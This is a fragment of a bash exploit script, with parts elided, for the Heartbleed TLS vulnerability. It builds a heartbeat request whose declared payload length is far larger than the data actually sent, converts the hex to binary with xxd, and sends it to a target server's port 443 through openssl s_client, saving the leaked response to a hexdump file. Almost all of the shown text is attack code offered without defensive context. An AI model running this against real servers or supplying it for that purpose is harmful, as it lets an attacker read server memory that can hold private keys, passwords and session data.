...
HEARTBEAT_REQUEST_HEX="18 03 02 00 03 01 40 00"

# Convert hex strings to binary
CLIENT_HELLO_NO_COMPRESSION_BIN=$(echo $CLIENT_HELLO_NO_COMPRESSION | xxd -r -p)
HEARTBEAT_REQUEST_BIN=$(echo $HEARTBEAT_REQUEST_HEX | xxd -r -p)
...
echo -n $HEARTBEAT_REQUEST_BIN | openssl s_client -connect "${SERVER_ADDRESS}:443" -tls1_1 -cipher ALL:!COMPLEMENTOFDEFAULT:!eNULL > hexdump.txt

# Add a delay to ensure openssl completes
sleep 1

echo "Finished sending heartbeat request"
